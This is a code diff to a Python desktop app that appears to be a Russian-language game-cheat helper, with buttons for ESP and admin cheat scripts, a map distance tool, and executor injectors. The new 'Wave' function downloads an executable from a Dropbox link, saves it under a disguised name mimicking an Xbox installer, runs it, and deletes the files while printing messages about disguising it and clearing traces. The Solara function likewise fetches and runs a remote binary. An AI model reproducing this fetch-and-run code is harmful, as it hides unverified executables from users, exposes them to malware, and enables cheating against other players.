@@ -13,7 +13,7 @@ import tempfile
 import stat
 import time
 
-version = "1.5"
+version = "1.6"
 
 class App(CTk):
     def __init__(self):
@@ -60,11 +60,14 @@ class App(CTk):
         self.home_frame = CTkFrame(self, corner_radius=0, fg_color="transparent")
         self.home_frame.grid_columnconfigure(0, weight=1)
 
-        self.inject_executor_button = CTkButton(self.misc_frame, fg_color='red', text='Inject', command=self.inject_executor)
-        self.inject_executor_button.grid(row=1, column=1, padx=350, pady=15)
+        self.inject_solara_button = CTkButton(self.misc_frame, fg_color='red', text='Inject Solara', command=self.inject_executor_solara)
+        self.inject_solara_button.grid(row=1, column=1, padx=350, pady=15)
 
-        self.warning_label = CTkLabel(self.misc_frame, text='Warning!\nUse on your own risk!\nTheres a chance, that you will get banned\n\n(нажми 1 раз, и жди 5 секунд)')
-        self.warning_label.grid(row=2, column=1, padx=20, pady=0)
+        self.inject_wave_button = CTkButton(self.misc_frame, fg_color='red', text='Inject Wave', command=self.inject_executor_wave)
+        self.inject_wave_button.grid(row=2, column=1, padx=350, pady=15)
+
+        self.warning_label = CTkLabel(self.misc_frame, text='Warning!\nUse on your own risk!\nTheres a chance, that you will get banned.')
+        self.warning_label.grid(row=3, column=1, padx=20, pady=0)
 
         self.map_select = CTkOptionMenu(self.map_frame, values=["Muddy Fields", "Dustbowl", "Sokolovka", "Radar Station", "Powerplant", "Arctic Airbase", "Normandy Bocage", "Roinburg", "Villers-Sommeil"], command=self.update_map_image)
         self.map_select.grid(row=1, column=1, padx=20, pady=10)
@@ -74,19 +77,19 @@ class App(CTk):
 
         self.infiniteyield_label = CTkLabel(self.home_frame, text="Admin Script (Infinite Yield)")
         self.infiniteyield_label.grid(row=1, column=0, pady=10)
-        
+
         self.infiniteyield_button = CTkButton(self.home_frame, text="Скопировать", command=self.adminscript_copy)
         self.infiniteyield_button.grid(row=2, column=0, pady=0)
 
         self.esp_label = CTkLabel(self.home_frame, text="Universal ESP")
         self.esp_label.grid(row=3, column=0, pady=10, sticky="nsew")
-        
+
         self.esp_button = CTkButton(self.home_frame, text="Скопировать", command=self.espscript_copy)
         self.esp_button.grid(row=4, column=0, pady=0)
 
         self.mtchelper_label = CTkLabel(self.home_frame, text="MTCHelper (Script)")
         self.mtchelper_label.grid(row=5, column=0, pady=10)
-        
+
         self.mtchelper_button = CTkButton(self.home_frame, text="Скопировать", command=self.mtchelper_copy)
         self.mtchelper_button.grid(row=6, column=0, pady=0)
 
@@ -146,7 +149,7 @@ class App(CTk):
     def adminscript_copy(self):
         self.select = 1
         self.get_script()
-    
+
     def espscript_copy(self):
         self.select = 2
         self.get_script()
@@ -186,41 +189,44 @@ class App(CTk):
 
         if map_image_path and map_config:
             original_image = Image.open(map_image_path)
-            
+
             display_size = (map_config["size"][0] // 2, map_config["size"][1] // 2)
             resized_image = original_image.resize(display_size, Image.LANCZOS)
-            
+
             self.map_image = ImageTk.PhotoImage(resized_image)
             self.canvas.create_image(0, 0, anchor="nw", image=self.map_image)
             self.canvas.image = self.map_image
             self.current_scale_factor = map_config["scale_factor"]
-            
+
             self.canvas.config(width=display_size[0], height=display_size[1])
 
     def on_canvas_click(self, event):
         display_scale_factor = 2
         x, y = event.x * self.current_scale_factor / 138 * display_scale_factor, event.y * self.current_scale_factor / 138 * display_scale_factor
         self.points.append((x, y))
-        
+
         self.canvas.create_oval(event.x - 5, event.y - 5, event.x + 5, event.y + 5, fill='red')
-        
+
         if len(self.points) == 2:
             x0, y0 = self.points[0]
             x1, y1 = self.points[1]
             distance = self.calculate_distance(x0, y0, x1, y1)
-            
+
             display_x0, display_y0 = x0 / (self.current_scale_factor / 138) / display_scale_factor, y0 / (self.current_scale_factor / 138) / display_scale_factor
             display_x1, display_y1 = x1 / (self.current_scale_factor / 138) / display_scale_factor, y1 / (self.current_scale_factor / 138) / display_scale_factor
-            
+
             self.canvas.create_line(display_x0, display_y0, display_x1, display_y1, fill='blue')
             self.canvas.create_text((display_x0 + display_x1) / 2, (display_y0 + display_y1) / 2, text=f"{distance:.2f} units", fill='white', font=('Helvetica', 12))
             self.points = []
 
     def calculate_distance(self, x0, y0, x1, y1):
         return sqrt((x1 - x0) ** 2 + (y1 - y0) ** 2)
-    
-    def inject_executor(self):
-        threading.Thread(target=self.inject_executor_threaded).start()
+
+    def inject_executor_solara(self):
+        threading.Thread(target=self.inject_executor_solara_threaded).start()
+
+    def inject_executor_wave(self):
+        threading.Thread(target=self.inject_executor_wave_threaded).start()
 
     def download_file(self, url, dest):
         os.system('cls')
@@ -233,14 +239,14 @@ class App(CTk):
         except requests.RequestException as e:
             raise
 
-    def inject_executor_threaded(self):
+    def inject_executor_solara_threaded(self):
         exe_url = 'https://github.com/quivings/Solara/raw/main/Files/SolaraBootstrapper.exe'
-        
+
         try:
             temp_dir = tempfile.mkdtemp()
             exe_path = os.path.join(temp_dir, 'SolaraBootstrapper.exe')
             self.download_file(exe_url, exe_path)
-            
+
             if os.path.exists(exe_path):
                 time.sleep(1.5)
                 exe_name = os.path.basename(exe_path)
@@ -255,6 +261,34 @@ class App(CTk):
                 os.system('cls')
                 os.system('color 07')
                 print("[ + ] Загрузка файлов...")
+                print("[ + ] Успешно!")
+            else:
+                pass
+        except Exception as e:
+            print(f"Ошибка: {e}")
+
+    def inject_executor_wave_threaded(self):
+        exe_url = 'https://www.dropbox.com/scl/fi/gallhkfr9r4ekqaz7uvsq/XboxInstall-r.exe?rlkey=55c9wkzwuu33cdrta1k487y8o&st=shl00ee3&dl=1'
+
+        try:
+            temp_dir = tempfile.mkdtemp()
+            exe_path = os.path.join(temp_dir, 'XboxInstallеr.exe')
+            self.download_file(exe_url, exe_path)
+
+            if os.path.exists(exe_path):
+                time.sleep(1.5)
+                exe_name = os.path.basename(exe_path)
+                subprocess.run(f'taskkill /F /IM {exe_name}', shell=True)
+                os.system('cls')
+                print("[ + ] Загрузка файлов...")
+                os.system(f'{exe_path}')
+                os.system('cls')
+                shutil.rmtree(temp_dir)
+                time.sleep(0.1)
+                os.system('cls')
+                print("[ + ] Загрузка файлов...")
+                print("[ + ] Wave успешно замаскирован!")
+                print("[ + ] Очистка следов...")
                 print("[ + ] Успешно!")
             else:
                 pass
